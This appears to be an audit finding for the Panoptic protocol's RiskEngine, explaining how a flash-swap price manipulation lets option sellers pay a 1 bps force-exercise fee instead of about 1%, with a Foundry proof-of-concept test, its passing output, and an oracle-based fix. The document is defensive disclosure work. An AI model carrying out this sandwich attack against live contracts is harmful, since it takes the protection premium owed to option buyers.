      "body": "## Finding description and impact\n\n### Description\nThe `RiskEngine.exerciseCost` function is responsible for calculating the fee that a \"Force Exercisor\" (typically an option seller) must pay to an \"Exercisee\" (an option buyer) when forcefully closing their position. \n\nThe protocol implements a tiered fee structure to protect active positions:\n1.  **In-Range Positions:** If a position is currently \"In-Range\" (the underlying asset price is close to the strike price), the fee is high (`FORCE_EXERCISE_COST` ≈ 1.024% of notional). This discourages sellers from forcefully closing active positions unless absolutely necessary.\n2.  **Out-of-Range Positions:** If a position is \"Out-of-Range\", the fee is nominal (`ONE_BPS` ≈ 0.01% of notional). This incentivizes the cleanup of stale liquidity.\n\nThe vulnerability exists in how the protocol determines if a position is \"In-Range\". The `exerciseCost` function iterates through the position's legs and checks the **`currentTick`** (the instantaneous spot price) against the strike range:\n\n```solidity\n// RiskEngine.sol\n\n// ... inside the leg loop ...\nif ((currentTick < _strike + rangeUp) && (currentTick >= _strike - rangeDown)) {\n    hasLegsInRange = true;\n}\n// ...\n\n// Fee determination based on hasLegsInRange\nint256 fee = hasLegsInRange ? -int256(FORCE_EXERCISE_COST) : -int256(ONE_BPS);\n```\n\nBecause `currentTick` reflects the instantaneous spot price of the Uniswap pool, it can be manipulated atomically within a transaction via a flash swap.\n\nAn attacker (e.g., an option seller blocked by a utilized pool) can perform the following sandwich attack in a single transaction:\n1.  **Manipulate Spot Price:** Execute a swap on the Uniswap pool to push the `currentTick` just outside the range of the victim's position. This deviation can be small enough to stay within the protocol's \"Safe Mode\" thresholds (`MAX_TICKS_DELTA`).\n2.  **Force Exercise:** Call `PanopticPool.forceExercise()`. The `RiskEngine` sees the `currentTick` is outside the range, sets `hasLegsInRange` to `false`, and charges the attacker the minimal `1 bps` fee instead of the intended `102 bps`.\n3.  **Reverse Swap:** Swap back to restore the price, recovering the capital used in step 1 (minus swap fees).\n\n### Impact\n*   **Theft of Yield:** Option buyers (Exercisees) are deprived of the protection premium (~1% of position value) they are economically entitled to.\n*   **Broken Protocol Invariant:** The mechanism designed to protect in-the-money/active positions is bypassed, allowing sellers to exit obligations cheaply at the expense of buyers.\n*   **Economic Damage:** On a standard 5bps fee tier pool, the cost to shift the tick momentarily is negligible compared to the 1% fee savings. This makes the attack highly profitable and practically guaranteed to occur whenever liquidity utilization is high.\n\n## Recommended mitigation steps\n\nThe determination of the fee tier should rely on the manipulation-resistant `oracleTick` (the internal TWAP/EMA) rather than the instantaneous `currentTick`.\n\nModify `RiskEngine.sol` to use `oracleTick` for the range check:\n\n```diff\n    function exerciseCost(\n        int24 currentTick,\n        int24 oracleTick,\n        TokenId tokenId,\n        PositionBalance positionBalance\n    ) external view returns (LeftRightSigned exerciseFees) {\n        // ...\n            // ... inside leg loop ...\n-               if ((currentTick < _strike + rangeUp) && (currentTick >= _strike - rangeDown)) {\n+               if ((oracleTick < _strike + rangeUp) && (oracleTick >= _strike - rangeDown)) {\n                    hasLegsInRange = true;\n                }\n            // ...\n```\n\n*Note: `currentTick` should still be used for calculating the intrinsic value delta (token amounts), but the `oracleTick` must dictate the fee tier.*",
      "proofOfConcept": "## Proof of Concept\n\nThe following test case demonstrates the exploit. It sets up an `RiskEngine` and a position that is currently \"In-Range\" according to the Oracle/TWAP. It then calculates the fee using the honest `currentTick` vs. a manipulated `currentTick` (shifted just outside the range).\n\nBy subtracting the intrinsic value delta (which naturally changes with price), the PoC isolates the **penalty fee** component and proves it drops by ~99% when the spot price is manipulated.\n\n-- Save the file in `test/foundry/core/POC.t.sol:ForceExerciseFeeExploit`\n-- Run the test using `forge test --match-test test_Exploit_ForceExerciseFee_Bypass -vv`\n\n```solidity\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.24;\n\nimport \"forge-std/Test.sol\";\nimport {RiskEngine} from \"@contracts/RiskEngine.sol\";\nimport {TokenId} from \"@types/TokenId.sol\";\nimport {PositionBalanceLibrary} from \"@types/PositionBalance.sol\";\nimport {Math} from \"@libraries/Math.sol\";\nimport {PanopticMath} from \"@libraries/PanopticMath.sol\";\nimport {LeftRightSigned} from \"@types/LeftRight.sol\";\nimport {LiquidityChunk} from \"@types/LiquidityChunk.sol\";\n\ncontract ForceExerciseFeeExploit is Test {\n    RiskEngine riskEngine;\n\n    function setUp() public {\n        // Deploy RiskEngine with standard Mainnet parameters\n        // 5_000_000 = 50% Target Utilization\n        riskEngine = new RiskEngine(5_000_000, 5_000_000, address(this), address(0));\n    }\n\n    function test_Exploit_ForceExerciseFee_Bypass() public {\n        // Setup Scenario:\n        // A short seller is trapped. A buyer holds a position.\n        // The position is currently IN RANGE (High Fee Expected).\n        // The seller wants to force exercise the buyer cheaply.\n\n        int24 tickSpacing = 10;\n        uint64 poolId = uint64(uint24(tickSpacing)) << 48;\n        \n        // Create a Narrow Position [990, 1010)\n        // Strike: 1000, Width: 2, TickSpacing: 10\n        TokenId tokenId = TokenId.wrap(0).addPoolId(poolId).addLeg(0, 1, 0, 1, 1, 0, 1000, 2);\n\n        // Simulation Vars\n        int24 oracleTick = 1000; // The TWAP is stable at 1000\n        int24 currentTickInRange = 1000; // Spot price is currently perfectly in range\n        \n        // 1. BASELINE: Calculate Fee when Honest (In-Range)\n        // Position is solvent, size is 1 ether.\n        LeftRightSigned resInRange = riskEngine.exerciseCost(\n            currentTickInRange, \n            oracleTick, \n            tokenId, \n            PositionBalanceLibrary.storeBalanceData(1 ether, 0, 0)\n        );\n        \n        // 2. EXPLOIT: Manipulate Spot Price to 989 (Just OTM)\n        // Attack: Flash swap price to 989. \n        // 989 is < lower bound 990. Position is now OTM.\n        // 11 tick delta is < 953 (Safe Mode Threshold), so protocol allows this.\n        int24 manipulatedTick = 989;\n\n        LeftRightSigned resManipulated = riskEngine.exerciseCost(\n            manipulatedTick, \n            oracleTick, \n            tokenId, \n            PositionBalanceLibrary.storeBalanceData(1 ether, 0, 0)\n        );\n\n        // 3. ISOLATE THE FEES\n        // The exerciseCost returns (IntrinsicValueDelta + PenaltyFee).\n        // We must subtract the IntrinsicValueDelta to prove the PenaltyFee changed.\n        \n        // Calculate the pure token movement caused by price shift (Oracle vs Spot)\n        (int256 d0_High, int256 d1_High) = _calculateIntrinsicDelta(tokenId, 1 ether, currentTickInRange, oracleTick);\n        (int256 d0_Low, int256 d1_Low) = _calculateIntrinsicDelta(tokenId, 1 ether, manipulatedTick, oracleTick);\n        \n        int256 actualFeeHigh = (resInRange.rightSlot() + resInRange.leftSlot()) - (d0_High + d1_High);\n        int256 actualFeeLow = (resManipulated.rightSlot() + resManipulated.leftSlot()) - (d0_Low + d1_Low);\n\n        console2.log(\"Fee Paid In-Range (Honest):\", actualFeeHigh);\n        console2.log(\"Fee Paid Manipulated (Exploit):\", actualFeeLow);\n\n        // 4. VERIFY EXPLOIT\n        // Convert to abs for comparison\n        uint256 feeHighAbs = actualFeeHigh < 0 ? uint256(-actualFeeHigh) : uint256(actualFeeHigh);\n        uint256 feeLowAbs = actualFeeLow < 0 ? uint256(-actualFeeLow) : uint256(actualFeeLow);\n\n        // Validates that the fee dropped significantly (approx 100x reduction)\n        // High Fee ~ 1% (102400 bps), Low Fee ~ 0.01% (1 bps)\n        assertGt(feeHighAbs, feeLowAbs * 50, \"Exploit Failed: Fee did not decrease significantly\");\n    }\n\n    // Helper to calculate the token delta component of the exercise cost\n    // This allows us to isolate the pure \"Penalty Fee\" from the \"Value Adjustment\"\n    function _calculateIntrinsicDelta(TokenId tokenId, uint128 positionSize, int24 currentTick, int24 oracleTick) internal pure returns (int256 d0, int256 d1) {\n        LiquidityChunk chunk = PanopticMath.getLiquidityChunk(tokenId, 0, positionSize);\n        (uint256 curr0, uint256 curr1) = Math.getAmountsForLiquidity(currentTick, chunk);\n        (uint256 orac0, uint256 orac1) = Math.getAmountsForLiquidity(oracleTick, chunk);\n        \n        // The RiskEngine subtracts the difference: exerciseFees.sub(current - oracle)\n        // Which is mathematically: Fee - (Current - Oracle) -> Fee + (Oracle - Current)\n        d0 = int256(orac0) - int256(curr0);\n        d1 = int256(orac1) - int256(curr1);\n    }\n}\n```\n\n**Output**\n```\nNo files changed, compilation skipped\n\nRan 1 test for test/foundry/core/POC.t.sol:ForceExerciseFeeExploit\n[PASS] test_Exploit_ForceExerciseFee_Bypass() (gas: 86484)\nLogs:\n  Fee Paid In-Range (Honest): -11316893620257102\n  Fee Paid Manipulated (Exploit): -110516539260323\n\nSuite result: ok. 1 passed; 0 failed; 0 skipped; finished in 2.58s (161.86ms CPU time)\n\n```",
